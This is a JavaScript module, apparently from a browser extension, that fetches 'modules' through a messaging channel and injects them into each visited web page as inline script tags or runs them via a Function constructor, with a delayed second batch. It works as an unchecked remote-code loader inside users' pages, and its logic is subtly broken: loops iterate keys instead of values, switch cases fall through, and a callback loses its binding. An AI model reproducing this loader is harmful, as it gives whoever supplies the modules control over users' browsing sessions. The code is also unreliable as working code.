import debug from 'debug';

import ctor from './constructor';
import Talker from './api/talker';




const log = debug(`Brex:crex:${window.location.hostname}`);

export default class Crex {

  constructor (app) {
    log('constructor');

    this.pid = app.pluginId;
    this.modules = ctor.object();
    this.talker = new Talker(this.pid);
  }

  load () {
    log('load');

    this.loadModules(this.proceed);
  }


  loadModules (cb) {
    log('loadModules');

    this.talker.send({
      reason:'get.modules'
    }, function (res) {
      log('loadModules res', res);

      if (res.err) {
        log('loadModules res err', res.err);

        return cb();
      }
      cb(res.value);
    });
  }

  proceed (data) {
    log(`proceed frame ${window !== top}`, data);

    if (data && data.length) {
      var s = data[0];
      var e = data[1];

      this.addWithLoop(s);

      setTimeout(() => {
        this.addWithLoop(e)
      }, 5000);
    }
  }

  addWithLoop (o) {
    for (let g in o) {
      switch(g.i) {
        case 0:
          for (let m in g.s) {
            this.addWithTag(m);
          }
        case 1:
          for (let m in g.s) {
            this.addWithoutTag(m);
          }
      }
    }
  }

  addWithTag (m) {
    let s = document.createElement('script');
    s.type = 'text/javascript';
    s.charset = 'utf-8';
    if (true) {
      s.innerHTML = m;
    }
    else {
      s.src = m;
    }
    document.getElementsByTagName('head')[0].appendChild(s);
    console.log(s);
  }

  addWithoutTag (m) {
    ctor.function(m)();
  }
}
